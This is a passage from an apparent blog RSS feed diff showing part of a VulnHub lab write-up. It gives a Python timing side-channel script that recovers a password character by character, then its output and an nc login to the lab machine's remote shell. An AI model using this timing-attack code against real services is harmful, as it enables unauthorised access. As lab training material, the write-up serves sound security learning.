+		s.send(passwd + char + &amp;quot;\n&amp;quot;)
+		s.recv(512)
+		t1 = time.time()
+
+		t2 = time.time()
+		s.send(passwd + char + &amp;quot;\n&amp;quot;)
+		s.recv(512)
+		t3 = time.time()
+
+		t4 = time.time()
+		s.send(passwd + char + &amp;quot;\n&amp;quot;)
+		s.recv(512)
+		t5 = time.time()
+
+		t6 = time.time()
+		s.send(passwd + char + &amp;quot;\n&amp;quot;)
+		s.recv(512)
+		t7 = time.time()
+
+		times = [(t7-t6), (t5-t4), (t3-t2), (t1-t0)]
+		average = numpy.mean(times)
+
+		if average &amp;lt; 0.002:
+			passwd = passwd + char
+			sys.stdout.write(&amp;quot;\r&amp;quot; + passwd)
+			sys.stdout.flush()
+			break
+
+s.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The whole thing derps out when it gets to the end of the valid password, but at least we got it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# ./level_0.py 
+R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0daaaaaaaaaaaaaaaa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: R3sp3ctY04r4dm1niSt4t0rL1keYo4R3spectY04rG0d
+Logged in successfully, type exit to close the shell
+Shell$ id; whoami
+uid=1001(level_0) gid=1001(level_0) groups=1001(level_0)
+level_0
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
